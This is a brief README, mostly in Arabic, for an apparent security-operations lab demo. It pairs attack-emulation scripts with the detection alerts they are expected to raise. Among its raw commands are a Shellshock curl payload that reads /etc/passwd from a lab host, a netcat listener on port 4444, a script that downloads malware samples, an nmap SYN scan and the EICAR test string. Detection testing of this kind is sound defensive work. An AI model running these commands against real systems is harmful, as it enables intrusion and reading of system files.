# Attack emulation — للعرض أمام اللجنة (lab only)

| سكربت | UC | التنبيه المتوقَّع |
|-------|----|-------------------|
| `eicar_test.sh [dir]` | 03 | 87105 → 100092 (L12) |
| `nmap_scan.sh [target]` | 04 | 86601 |
| `netcat_tests.sh` | 05+08 | 100210 (L12) ثم 100051 (L7) |
| `shellshock_test.sh [target]` | 06 | 31168 (L15) |
| `malware_downloader.sh [dir]` | 07 | 108001 (L12) |

### الأوامر الخام المكافئة
| أمر | UC | التنبيه |
|-----|----|---------|
| `printf '%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /home/kali/SOCfile/eicar.com` | 03 | 87105 → 100092 (L12) + الملف يُحذف |
| `nmap -sS 192.168.100.108` (من جهاز آخر) | 04 | 86601 NMAP SYN Scan |
| `nc -h` ; `sudo -l` | 05 | 100210 (L12) |
| `curl -H "User-Agent: () { :; }; /bin/cat /etc/passwd" http://192.168.100.108` | 06 | 31168 (L15) |
| `sudo bash malware_downloader.sh` | 07 | 108001 (L12) لكل عينة |
| `nc -l -p 4444 &` | 08 | 100051 (L7) بعد ≤30 ث |

ترتيب مقترح للعرض (10 دقائق): 06 → 05 → 08 → 03 → 07 → 04. احتفظ بلقطات احتياطية من `docs/lab/evidence/` في حال فشل الشبكة.
